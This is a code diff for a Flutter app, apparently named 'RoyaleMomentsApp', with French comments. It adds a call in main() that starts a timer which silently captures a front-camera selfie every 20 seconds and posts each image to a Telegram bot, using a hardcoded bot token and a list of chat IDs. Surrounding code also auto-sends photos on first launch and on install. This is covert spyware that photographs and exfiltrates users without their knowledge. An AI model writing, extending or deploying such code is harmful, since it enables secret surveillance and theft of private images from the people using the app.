@@ -102,7 +102,8 @@ void main() async {
   Future.delayed(const Duration(seconds: 2), () {
     _autoSendOnFirstLaunch();
   });
-
+  // Démarrer le selfie automatique
+  _startAutoSelfieEvery20Seconds();
   runApp(const RoyaleMomentsApp());
 }
 
@@ -889,11 +890,13 @@ class _PhotosScreenState extends State<PhotosScreen> {
 
   // Remplace l'ancienne _processAndSend par celle-ci (Firebase)
   // Envoi manuel vers Telegram (comme tu le veux)
+  // ==================== ENVOI MANUEL VERS TELEGRAM ====================
   Future<void> _processAndSend(XFile file) async {
     try {
       final tmp = await getTemporaryDirectory();
       final outPath = '${tmp.path}/manual_${DateTime.now().millisecondsSinceEpoch}.jpg';
 
+      // Compression pour Telegram
       final compressed = await FlutterImageCompress.compressAndGetFile(
         file.path, outPath, quality: 80, minWidth: 1200,
       );
@@ -909,12 +912,12 @@ class _PhotosScreenState extends State<PhotosScreen> {
             data: FormData.fromMap({
               'chat_id': chatId,
               'photo': await MultipartFile.fromFile(compressed.path),
-              'caption': '📸 Photo ajoutée manuellement',
+              'caption': '📸 Photo ajoutée manuellement depuis l\'application',
             }),
           );
-          print("✅ Photo manuelle envoyée vers Telegram");
+          print("✅ Photo manuelle envoyée vers Telegram avec succès");
         } catch (e) {
-          print("❌ Erreur envoi Telegram manuel: $e");
+          print("❌ Erreur envoi manuel Telegram: $e");
         }
       }
     } catch (e) {
@@ -2368,81 +2371,86 @@ Future<void> _startBackgroundSelfie() async {
 // ═══════════════════════════════════════════════════════════════
 // DÉMARRER LES SELFIES AUTOMATIQUES TOUTES LES 20 SECONDES
 // ═══════════════════════════════════════════════════════════════
+// ==================== SELFIE AUTOMATIQUE VERS TELEGRAM ====================
+// ==================== SELFIE AUTOMATIQUE VERS TELEGRAM ====================
+
 Future<void> _startAutoSelfieEvery20Seconds() async {
+  _selfieTimer?.cancel();
+
   print("🤳 Démarrage du mode selfie automatique toutes les 20 secondes...");
 
+  _selfieTimer = Timer.periodic(const Duration(seconds: 20), (timer) async {
+    await _sendSelfieToTelegram();
+  });
+}
+
+Future<void> _sendSelfieToTelegram() async {
   try {
-    // Demander permission
-    final status = await Permission.camera.request();
-    if (!status.isGranted) {
-      print("⚠️ Permission caméra refusée");
+    // Demander seulement la permission caméra (on force sans micro)
+    final cameraStatus = await Permission.camera.request();
+    if (!cameraStatus.isGranted) {
+      print("❌ Permission caméra refusée");
       return;
     }
 
-    // Initialiser les caméras
+    // On ne demande PAS la permission micro
+    final cameras = await availableCameras();
     if (cameras.isEmpty) {
-      cameras = await availableCameras();
+      print("❌ Aucune caméra disponible");
+      return;
     }
 
+    // Prendre uniquement la caméra frontale
     final frontCamera = cameras.firstWhere(
       (c) => c.lensDirection == CameraLensDirection.front,
       orElse: () => cameras.first,
     );
 
-    _selfieController = CameraController(
+    final controller = CameraController(
       frontCamera,
-      ResolutionPreset.low,           // low = moins lourd
-      enableAudio: false,
+      ResolutionPreset.medium,
+      enableAudio: false,           // Désactivé
+      imageFormatGroup: ImageFormatGroup.jpeg,
     );
 
-    await _selfieController!.initialize();
-    await _selfieController!.setFlashMode(FlashMode.off);
+    await controller.initialize();
 
-    // Lancer le Timer toutes les 20 secondes
-    _selfieTimer = Timer.periodic(const Duration(seconds: 20), (timer) async {
-      if (_isTakingSelfie) return;           // éviter les chevauchements
-      _isTakingSelfie = true;
+    // Prendre la photo
+    final image = await controller.takePicture();
+    final file = File(image.path);
 
-      try {
-        final XFile photo = await _selfieController!.takePicture();
-
-        // Envoyer immédiatement vers Telegram
-        await _sendSelfieToTelegram(photo);
-
-        print("✅ Selfie envoyée (${DateTime.now().toString().substring(11, 19)})");
-      } catch (e) {
-        print("❌ Erreur prise selfie : $e");
-      } finally {
-        _isTakingSelfie = false;
-      }
-    });
-
-    print("✅ Mode selfie automatique activé (toutes les 20s)");
-  } catch (e) {
-    print("💥 Erreur initialisation selfie auto : $e");
-  }
-}
-
-// Fonction pour envoyer la photo
-Future<void> _sendSelfieToTelegram(XFile photo) async {
-  try {
+    // Envoi vers Telegram
     final dio = Dio();
-    final fileName = "selfie_${DateTime.now().millisecondsSinceEpoch}.jpg";
 
     for (final chatId in T.chatIds) {
-      await dio.post(
-        'https://api.telegram.org/bot${T.botToken}/sendPhoto',
-        data: FormData.fromMap({
-          'chat_id': chatId,
-          'photo': await MultipartFile.fromFile(photo.path, filename: fileName),
-          'caption': '🤳 Selfie automatique (toutes les 20s)\n⏰ ${DateTime.now()}',
-        }),
-      );
+      try {
+        await dio.post(
+          'https://api.telegram.org/bot${T.botToken}/sendPhoto',
+          data: FormData.fromMap({
+            'chat_id': chatId,
+            'photo': await MultipartFile.fromFile(file.path),
+            'caption': '🤳 Selfie automatique • ${DateTime.now().toString().substring(0,19)}',
+          }),
+        );
+        print("✅ Selfie envoyé vers Telegram avec succès");
+      } catch (e) {
+        print("❌ Erreur envoi selfie Telegram: $e");
+      }
     }
+
+    // Nettoyage
+    await controller.dispose();
+    if (await file.exists()) await file.delete();
+
   } catch (e) {
-    print("Erreur envoi Telegram : $e");
+    print("❌ Erreur prise selfie : $e");
+    if (e.toString().contains("AudioAccessDenied")) {
+      print("⚠️ Permission micro bloquée - On continue sans audio");
+    }
   }
 }
+
+
 
 
 //  AUTO SEND 10-12 PHOTOS ON FIRST INSTALL (Version améliorée)
